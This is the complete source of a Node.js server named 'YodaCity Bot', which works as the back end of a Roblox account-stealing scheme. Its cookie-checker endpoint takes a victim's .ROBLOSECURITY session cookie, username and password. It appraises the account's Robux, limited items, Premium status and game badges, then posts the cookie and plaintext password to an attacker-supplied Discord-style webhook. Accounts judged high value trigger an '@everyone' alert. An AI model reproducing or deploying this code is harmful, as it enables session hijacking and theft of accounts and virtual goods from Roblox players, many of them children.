const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// ─── Roblox API ──────────────────────────────────────────────────
async function getUserInfo(cookie) {
    try {
        const res = await fetch('https://www.roblox.com/mobileapi/userinfo', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return null;
        return await res.json();
    } catch { return null; }
}

async function getRobux(cookie) {
    try {
        const res = await fetch('https://economy.roblox.com/v1/currency/balance', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return 0;
        const data = await res.json();
        return data.robux || 0;
    } catch { return 0; }
}

async function getRAP(cookie, userId) {
    try {
        let items = [];
        let cursor = '';
        while (true) {
            const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
            const res = await fetch(url, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            });
            if (!res.ok) break;
            const data = await res.json();
            items = items.concat(data.data || []);
            if (!data.nextPageCursor) break;
            cursor = data.nextPageCursor;
        }
        const rap = items.reduce((sum, i) => sum + (i.recentAveragePrice || 0), 0);
        return { rap, count: items.length, names: items.slice(0, 5).map(i => i.name).join(', ') || 'None' };
    } catch { return { rap: 0, count: 0, names: 'None' }; }
}

async function checkBadge(cookie, badgeId) {
    try {
        const res = await fetch(`https://www.roblox.com/badge/asset-owned?badgeId=${badgeId}&userId=0`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return res.ok;
    } catch { return false; }
}

function fmt(n) { return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','); }

// ─── Homepage ─────────────────────────────────────────────────────
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>YodaCity Bot</title>
        <style>
            body { font-family: Arial; background: #0d0d1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
            .card { background: #1a1a2e; padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
            h1 { background: linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
            .status { color: #4ade80; }
            .endpoint { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; margin: 10px 0; font-family: monospace; }
        </style>
        </head>
        <body>
            <div class="card">
                <h1>✦ YodaCity Bot</h1>
                <p class="status">✅ ONLINE</p>
                <p>Cookie Checker Endpoint:</p>
                <div class="endpoint">POST /api/check-cookie</div>
                <p style="color:#64748b;font-size:12px;margin-top:20px;">${new Date().toISOString()}</p>
            </div>
        </body>
        </html>
    `);
});

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// ─── Cookie Checker Endpoint ──────────────────────────────────────
app.post('/api/check-cookie', async (req, res) => {
    const { cookie, webhook, linkId, username: inputUsername, password } = req.body;
    
    if (!cookie || !webhook) {
        return res.json({ error: 'Missing cookie or webhook' });
    }

    console.log('🔄 Checking cookie...');

    const userInfo = await getUserInfo(cookie);
    if (!userInfo) {
        await sendToWebhook(webhook, {
            embeds: [{
                title: '⚠️ Invalid Cookie',
                color: 0xf59e0b,
                description: 'The .ROBLOSECURITY cookie is invalid or expired.',
                fields: [
                    { name: '📧 Username', value: inputUsername || 'Unknown', inline: true },
                    { name: '🍪 Cookie (preview)', value: `\`\`\`${cookie.substring(0, 100)}...\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });
        return res.json({ valid: false });
    }

    const userId = userInfo.UserID || userInfo.userId || userInfo.id;
    const username = userInfo.UserName || userInfo.username || 'Unknown';
    const displayName = userInfo.DisplayName || username;
    
    console.log(`✅ Valid cookie: ${username} (${userId})`);

    const [robux, rapData, adoptMe, mm2, ps99] = await Promise.all([
        getRobux(cookie),
        getRAP(cookie, userId),
        checkBadge(cookie, 1672196408),  // Adopt Me
        checkBadge(cookie, 212210118),   // MM2
        checkBadge(cookie, 1827857731)   // PS99
    ]);

    const isPremium = userInfo.IsPremium || userInfo.isPremium || false;
    const thumbnail = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    const isHighValue = robux > 10000 || rapData.rap > 50000 || isPremium;

    const embed = {
        title: `🎯 ${username}`,
        color: isPremium ? 0xf59e0b : 0xef4444,
        thumbnail: { url: thumbnail },
        fields: [
            { name: '👤 Username', value: `**${username}**`, inline: true },
            { name: '🆔 ID', value: `\`${userId}\``, inline: true },
            { name: '🏷️ Display', value: displayName, inline: true },
            
            { name: '💰 Robux', value: `**${fmt(robux)}**`, inline: true },
            { name: '📊 RAP', value: `**${fmt(rapData.rap)}**`, inline: true },
            { name: '⭐ Premium', value: isPremium ? '✅ **Yes**' : '❌ No', inline: true },

            { name: '💎 Limiteds', value: `**${rapData.count}** items`, inline: true },
            { name: '🏆 Top Items', value: rapData.names.substring(0, 200) || 'None', inline: false },

            { name: '🐾 Adopt Me', value: adoptMe ? '✅ Plays' : '❌ No', inline: true },
            { name: '🔪 MM2', value: mm2 ? '✅ Plays' : '❌ No', inline: true },
            { name: '🐉 PS99', value: ps99 ? '✅ Plays' : '❌ No', inline: true },

            { name: '📧 Email', value: `\`\`\`${inputUsername || 'Unknown'}\`\`\``, inline: false },
            { name: '🔐 Password', value: password ? `\`\`\`${password}\`\`\`` : 'Not captured', inline: false },
            { name: '🍪 Cookie', value: `\`\`\`${cookie.substring(0, 250)}...\`\`\``, inline: false },
            
            { name: '🔗 Link ID', value: linkId || 'N/A', inline: true },
            { name: '⏰ Time', value: new Date().toISOString(), inline: true }
        ],
        footer: { text: 'YodaCity Cookie Checker' },
        timestamp: new Date().toISOString()
    };

    await sendToWebhook(webhook, {
        content: isHighValue ? '@everyone 🚨 **HIGH VALUE ACCOUNT!**' : null,
        embeds: [embed]
    });

    res.json({ valid: true, username, userId, robux, rap: rapData.rap, isPremium });
});

async function sendToWebhook(url, payload) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {
        console.error('Webhook error:', e.message);
    }
}

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ YodaCity Bot running on port ${PORT}`);
});
